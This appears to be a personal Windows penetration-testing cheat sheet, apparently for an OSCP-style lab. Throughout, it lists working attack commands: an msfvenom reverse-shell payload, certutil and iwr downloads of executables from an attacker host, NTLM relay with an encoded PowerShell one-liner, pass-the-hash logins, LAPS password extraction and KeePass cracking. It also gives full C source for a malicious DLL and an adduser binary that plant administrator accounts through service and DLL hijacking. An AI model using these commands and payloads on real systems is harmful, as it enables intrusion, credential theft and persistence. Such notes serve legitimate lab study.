## Quick Reference
- `dir /s/b local.txt` - Usually `C:\` or `C:\users\username\desktop\`
- `dir /s/b proof.txt` - Usually `C:\Users\Administrator\Desktop\`
- `dir /s/b *.txt`
- RDP: `xfreerdp /u:username /p:password /v:192.168.x.x /cert:ignore`
- RevShell.exe: `msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=4444 -f exe -o revshell.exe`
- Compile C: `/usr/bin/x86_64-w64-mingw32-gcc cfile.c -o output.exe`
- Compile C#: `msbuild projectname.csproj`
- Transfer to Windows host: `certutil -split -urlcache -f http://192.168.x.x/revshell.exe C:\\Users\\username\\revshell.exe`
- Fix Broken Path: `set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;`
- Windows Exploit Suggester: [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
## Port Enumeration (from Kali)
- **HTTP/WebDav (80)**: `cadaver 192.168.`
	- Run `put /usr/share/webshells/aspx/cmdasp.aspx` to upload command shell, then access via browser
- **Kerberos (88)**: `kerbrute userenum -d domain.name --dc 192.168. users`
- **SMB (139/445)**: `sudo nmap --script smb-vuln* -p 139,445 192.168.`
	- `smbclient -U user \\\\192.168.`
	- `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.xx.xxx -c "powershell -enc JABjAGwAaQBlAG4AdA..."` (base64 powershell one-liner)
		- Kali: Call fake directory `dir \\192.168.xx.xxx\fake` for reverse shell
	- Pass the Hash: `smbclient \\\\192.168.xx.xxx\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b`
- **LDAP (389)**: `sudo nmap -n -sV -Pn -script 'ldap* and not brute' 192.168.`
	- Domain Name found (LDAP Search): `ldapsearch -v -x -b 'DC=domain,DC=name' -H 'ldap://192.168.' '(objectclass=*)'`
	- Use credentials to find admin password `ldapsearch -x -H 'ldap://192.168.x.x' -D 'domain\user' -w 'userpassword' -b 'dc=domain,dc=name' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`
		- To Login `psexec.py domain.name/administrator: 'adminpassword'@192.168.x.x` to login
## Impacket 
Psexec.py - `/usr/share/doc/python3-impacket/examples/psexec.py`
`impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx`
## PrivEsc (From Windows)
[HackTricks - Windows PrivEsc Checklist](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)
- Group memberships of the current user: `whoami /groups`
	- Existing groups: `net localgroup` or `Get-LocalGroup`	
	- Inspect groups `Get-LocalGroupMember groupname`
- Existing users: `net user` or `Get-LocalUser`
	- Look for *Remote Desktop Users* (access with RDP) and *Remote Management Users* (Access with WinRM)
	- Look for *Log on as a batch job* and schedule a task to execute a program
	- Try `backupadmin`: `runas /user:backupadmin cmd` (Prompt for password)
- Operating system, version and architecture: `systeminfo` 
	- Wiki Windows build number
	- Look for [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits?tab=readme-ov-file)
- Network information: `ipconfig /all`
	- Check `route print`
	- Show active connections `netstat -ano`
- Installed applications: 
	- 32-bit applications `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname` (Note - Remove `select displayname` for full properties)
	- 64-bit applications `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname` (Note - Remove `select displayname` for full properties)
	- Running processes: `get-process`

Well Known SIDs for PrivEsc (User RID users starts at 1000, eg 1001 is 2nd user)
```
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator
```
### Find Credentials
Try each of these steps ***for each user you get access to***
- Cleartext files: `Get-ChildItem -Path C:\Users\username -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
- Powershell history: `get-history` or `(Get-PSReadlineOption).HistorySavePath`
	- "Enter-PSSession", copy/paste the commands into terminal again.
- Keepass: `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue` 
	- `keepass2john Database.kdbx > keepass.hash` 
	- Remove `Database` from start of `keepass.hash` then `john keepass.hash`
- XAMPP: `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
### Evil-WinRM - Creates Powershell Remoting Session
- Login: `evil-winrm -i 192.168.xx.xxx -u user -p "password\$\!"` (escape special characters: `"password$!"` = `"password\$\!"`)
## Using Scheduled Tasks
- Find scheduled tasks: `schtasks /query /fo LIST /v` 
	- Inspect `Author`, `Taskname`, `Task To Run`, and `Next Run Time`
	- Find regularly scheduled task (every minute) in a folder you can change
	- Move original to safe space: `move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak`
	- Pull `adduser.exe` in with iwr: `iwr -uri http://192.168.xx.xxx/adduser.exe -outfile C:\target\path\scheduledtask.exe`
- `C:\Users\moss\Searches\VoiceActivation.exe`
### Services
- Find running processes: `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
- Start Process monitor and filter for target process 
	- Use `restart-servce servicename` if nothing is listed
	- Search for DLLs with;
		- Operation `CreateFile` 
		- Details `NAME NOT FOUND` 
		- With path to a folder you control (see `$env:path` for paths)
- Create a DLL with that name (eg. `mousepad myDLL.cpp`) 
```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user john password123! /add");
  	    i = system ("net localgroup administrators john /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
- Cross-compile with mingw32: `x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll`
- Run http server and pull DLL onto target system: `iwr -uri http://192.168.xxx.xx/myDLL.dll -Outfile myDLL.dll`
- Move DLL to folder you control, then restart service with `restart-service servicename`
- Check for new user: `net user`
## Service Binary Hijacking
- Find running processes `Powershell: Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
	- Keep an eye out for services NOT installed in `System32`
- Check permissions for target binary; `Powershell: icacls "C:\xampp\apache\bin\httpd.exe"
	- Look for `BUILTIN\Users:(F)` (Full Access for standard users)
### Permissions for Icacls
- Replace original binary with a new one written in C (`adduser.c`) that will create a new administrator (`dave2:password123!`)
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
- Compile the C code with MingW32: `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
- Pull new binary (from Kali server) onto target from Powershell: `iwr -uri http://192.168.xxx.xx/adduser.exe -Outfile adduser.exe`
- Move original service binary to home: `move C:\xampp\apache\bin\httpd.exe httpd.exe`
- Move & Rename new binary into it's place: `move .\adduser.exe C:\xampp\apache\bin\httpd.exe`
- Restart the running service: `net stop httpd` then `net start httpd`
- `C:\BackupMonitor\BackupMonitor.exe`
### Service Control Privilege
If user does not have service control privilege: 
- See if service has `Auto` StartMode: `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'httpd'}
- If user has `SeShutdownPrivilege` (check `whoami /priv`) then reboot: `shutdown /r /t 0`
## Service DLL Hijacking

```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```
Standard DLL search order on current Windows versions
Find running processes: `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
Start Process monitor and filter for target process (Use ProcMon64.exe?)
- Use `restart-servce servicename` if nothing is listed
- Search for DLLs with;
	- Operation `CreateFile` 
	- Details `NAME NOT FOUND` 
	- With path to a folder you control (see `$env:path` for paths)
- Create a DLL with that name (eg. `mousepad myDLL.cpp`) 
```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user john password123! /add");
  	    i = system ("net localgroup administrators john /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
- Cross-compile with mingw32: `x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll`
- Run http server and pull DLL onto target system: `iwr -uri http://192.168.xxx.xx/myDLL.dll -Outfile myDLL.dll`
- Move DLL to folder you control, then restart service with `restart-service servicename`
- Check for new user: `net user`
## Unquoted Service Paths
Look for services that have spaces in the file path, and create an .exe with part of the path
``` Example
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

- Using CMD: `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`
- Test starting/stopping service: `start-service servicename` & `stop-service servicename`
- Test parts of the path to find write-permissions `(RX,W)` for the current user:
	- eg. `icacls "C:\"` then `icacls "C:\Program Files` then `C:\Program Files\Enterprise Apps`
	- If the `Enterprise Apps` folder is writeable, then rename `adduser.exe` to the partial path; eg. `Current.exe` for `C:\Program Files\Enterprise Apps\Current.exe`
	- Start or restart the service to execute the malicious binary in the path
### Privileges
- Check if user has admin access: `Find-LocalAdminAccess` (can take several mins)
- Check system for logged in users: `Get-NetSession -ComputerName files04 -Verbose`
	- Windows has updated since `v10.0 (16299)` (aka build 1709) to block `Net-Session`
	Alternatively:
	- Upload/Use Psloggedon.exe: `.\PsLoggedon.exe \\host04`
- Add a user to a group: `net group "Management Department" stephanie /add /domain
	- And remove: `net group "Management Department" stephanie /del /domain`
- Change the password of a user you control: `Set-ADAccountPassword -Identity "robert" -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd" -Force)`

